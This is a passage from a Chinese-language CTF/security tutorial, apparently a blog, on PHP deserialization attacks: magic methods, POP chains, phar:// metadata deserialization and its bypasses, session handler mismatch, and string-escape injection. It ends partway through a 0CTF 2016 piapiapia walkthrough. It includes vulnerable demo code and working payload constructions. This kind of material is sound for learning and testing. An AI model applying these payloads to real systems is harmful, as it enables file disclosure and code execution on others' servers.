class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;i:<span class="number">19</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;infoc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果仔细观察会发现protected和private变量序列化后变量名长度发生了变化</p><ul><li><p>s:4:”*b”;</p></li><li><p>s:7:”infoc”</p><p>我们用010打开1.txt</p><p><img src="/../images/image-20220714122008106.png" alt="image-20220714122008106"></p></li></ul><p>​可以发现protected序列化后，会在变量名前加上%00*%00</p><p>​而private序列化后，会在变量名前加上%00类名%00</p><blockquote><p>在实际运用中可以用\00（<code>空</code>）用%00代替</p><p>原因：php的<code>urlencode()</code>会自动把<code>空</code>编码成%00</p></blockquote><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: 魔术方法 - Manual</a></p><h3 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类的构造函数，创建类对象时调用</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的析构函数，对象销毁时调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行serialize()时，会先调用这个函数，再调用construct函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行unserialize()时，会先调用这个函数，再调用destruct函数</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当调用的方法不存在时触发</span></span><br><span class="line"><span class="comment">$name: 被调用方法的名字</span></span><br><span class="line"><span class="comment">$arguments：传递给被调用方法的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类被当成字符串时</span></span><br><span class="line"><span class="comment">1.输出对象：echo/print等 </span></span><br><span class="line"><span class="comment">2.函数的参数类型为字符串，将对象作为参数时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br></pre></td></tr></table></figure><ul><li><p>__invoke()</p><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;触发了ivoke魔术方法&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#实例化对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">#以调用函数的方式调用一个对象</span></span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;触发了ivoke魔术方法</span><br></pre></td></tr></table></figure></li><li><p>不可访问（protected 或 private）或不存在的属性</p><p>赋值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。</p><p>读取时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</p><p>调用 <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或 <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</p><p>调用 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> 会被调用。</p></li><li><p>其他</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure></li></ul><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>有序列化就有反序列化，漏洞点就产生于反序列化时。</p><p>因为序列化数据中存储的是类对象的属性，如果未对用户输入的序列化字符串进行检测，攻击者就可以构造恶意序列化数据，控制反序列化过程，从而<strong>覆盖变量</strong>，进而导致代码执行，SQL 注入，目录遍历等不可控后果。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li><p>定位序列化和反序列化代码，找到可控参数和反序列化对象</p></li><li><p>明确要利用的方法和属性</p></li><li><p>根据其所在类的魔术方法构造pop链（传入参数到触发关键函数,注意类属性的类型）</p><p>在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p></li><li><p>传递构造好的序列化内容(最好要urlencode一下)，触发反序列化，完成攻击</p></li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;<span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现 __toStrong() 方法，而又存在 <code>echo $a</code> 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 <code>return $this-&gt;str-&gt;flag</code>时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。之后要 include <code>&#39;flag.php&#39;</code>，由于$name &#x3D;&#x3D; flag，所以要构造 $flag &#x3D;&#x3D; ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。</p><p>即</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="phar反序列化–PHP-lt-8"><a href="#phar反序列化–PHP-lt-8" class="headerlink" title="phar反序列化–PHP&lt;8"></a>phar反序列化–PHP&lt;8</h1><h2 id="phar是什么"><a href="#phar是什么" class="headerlink" title="phar是什么"></a>phar是什么</h2><ol><li><p>功能：压缩文件，将内容序列化存储</p></li><li><p>如何生成：</p><blockquote><p>注意：要将php.ini中的phar.readonly选项设置为Off,并删除前面的;否则无法生成phar文件。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>文件格式</p><p>用010打开生成的test.phar，观察phar文件的四个组成部分</p></li></ol><p><img src="/../images/image-20220708184054295.png" alt="image-20220708184054295"></p><p>​    关注stub和manifest</p><p>​stub：phar识别标志，只要有了这个识别标志，<strong>即使后缀名不为phar，php仍能够将文件识别为phar文件</strong></p><p>​manifest：这一部分是我们可控的地方，是反序列化漏洞的关键点</p><p>​    signature：当我们需要改变phar文件内容时，需要重新生成签名</p><p>​     </p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ol><li><p>phar中manifest是用户自定义的</p></li><li><p>php一大部分的<strong>文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</strong>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#test.phar是上面生成代码生成的</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;phar://test.phar&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20220708185428364.png" alt="image-20220708185428364"></p><p>3.受到影响的函数</p><p>From <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><p><img src="/../images/image-20220714125317293.png" alt="image-20220714125317293"></p><p>​</p></li></ol><p></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol><li><p>绕过phar开头</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p>绕过phar标识符<code>&lt;?php __HALT_COMPILER(); ?&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip phar.phar #使用压缩后phar文件同样也能反序列化</span><br></pre></td></tr></table></figure></li><li><p>签名修改</p></li></ol><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p><h2 id="session工作流程"><a href="#session工作流程" class="headerlink" title="session工作流程"></a>session工作流程</h2><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1685604427875.png" alt="20191026142328-1fba974c-f7b9-1"></p><h2 id="session序列化"><a href="#session序列化" class="headerlink" title="session序列化"></a>session序列化</h2><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的。</p><blockquote><p>通常文件名为sess_sessionid的形式，默认的引擎是php</p></blockquote><p><img src="/../images/image-20220730213222612.png" alt="image-20220730213222612"></p><h2 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h2><p>session序列化和反序列化所使用到的引擎不同</p><p>例如</p><ul><li><p>第一次请求，序列化用的引擎为php</p><p>假设要保存到session的数据为username&#x3D;khaz</p><ul><li><p>php怎么知道要保存哪些数据到session中</p><blockquote><p>通过在$_SESSION环境变量注册</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将username变量保存到session中</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>会话结束后，将$_SESSION序列化保存到session文件中。</p><p>正常保存</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果我们构造username&#x3D;|a:1:{s:8:”passwd”;s:4:”Khaz”;}</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>第二次请求，反序列化用的引擎为php_serialize</p><p>正常</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br><span class="line">→ <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><p>攻击</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">→ <span class="variable">$_SESSION</span>[<span class="string">&#x27;passwd&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><blockquote><p>从而我们就可以自定义$_SESSION环境变量的值</p></blockquote></li></ul><h1 id="过滤不当导致的字符串逃逸反序列"><a href="#过滤不当导致的字符串逃逸反序列" class="headerlink" title="过滤不当导致的字符串逃逸反序列"></a>过滤不当导致的字符串逃逸反序列</h1><h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>php反序列化特点</p><ul><li>以}作为结束符，在}之后的字符会被舍去</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;fdafadf&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>反序列化时会根据前面给定的长度，读取对应长度的字符串</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;&quot;&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//s:4:&quot;(a&quot;;&quot;)&quot;; 括号只是标注处字符串</span></span><br><span class="line"><span class="comment">//长度为4从第一个&quot;开始读取4个字符a&quot;;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&quot;;&quot;&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当序列化的长度&#x2F;数量与实际不符时，反序列化会报错</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//s:4:&quot;a&quot;; 长度为4，实际字符串为a，长度为1</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:3:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//a:3说明有三个值，实际上a=&gt;1,b=&gt;2,只有两个值</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">error  </span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>当存在以下流程：序列化→过滤→反序列化</p><ul><li><p>过滤：在对可控变量进行过滤了之后，就会使得其序列化的长度与字符串长度不匹配，然后反序列化的时候就会报错，无法执行反序列化，就不会执行攻击者构造的攻击代码。但是利用前面提到的第一和第二个特性，攻击者可以分析过滤前后字符串长度的变化，构造字符串(字符串形式为被过滤字符+目标子串)来覆盖其他变量。</p></li><li><p>目标字串：</p><p><code>&quot;;+序列化后的变量+&#125;</code></p><p>例如我想要逃逸<code>$name=&#39;khaz&#39;</code>，那么目标字串为<code>&quot;;s:4:&quot;name&quot;;s:4:&quot;khaz&quot;;&#125;</code></p></li></ul><h2 id="分类和思路"><a href="#分类和思路" class="headerlink" title="分类和思路"></a>分类和思路</h2><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路：让过滤后的字符串填充完长度，从而让后面的变量解放出来</span><br><span class="line">需要计算目标字串的长度l1和过滤后增加的长度l2</span><br><span class="line">payload:被过滤字符*(l1/l2)+目标子串</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">假设对变量<span class="variable">$a</span>进行过滤</span><br><span class="line">过滤规则：a→bb</span><br><span class="line"><span class="variable">$a</span>中的每个a在过滤后都会使字符串长度加<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">假设目标子串为：<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125; 一共31个字符</span></span><br><span class="line"><span class="string">就需要重复a31次，构造<span class="subst">$a</span>=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">这样序列化后有：</span></span><br><span class="line"><span class="string">s:62:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span></span><br><span class="line"><span class="string">此时长度对应字符：62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">过滤后：</span></span><br><span class="line"><span class="string">s:62:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string">长度对应字符： 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">从而使s:8:&quot;password&quot;;s:6:&quot;123456&quot;;解放出来</span></span><br></pre></td></tr></table></figure><h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p><a href="http://www.zip得到源码,审计得到如下关键点/">www.zip得到源码，审计得到如下关键点</a></p><ol><li><p>flag在config.php</p></li><li><p>过滤函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用_代替\和\\</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#用hacker代替array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;)</span></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>字符串逃逸：字符串变多 where：5  →  hacker：6  </p></li><li><p>反序列化点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>字符串逃逸覆盖$photo为config.php</p></li><li><p>序列化点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span 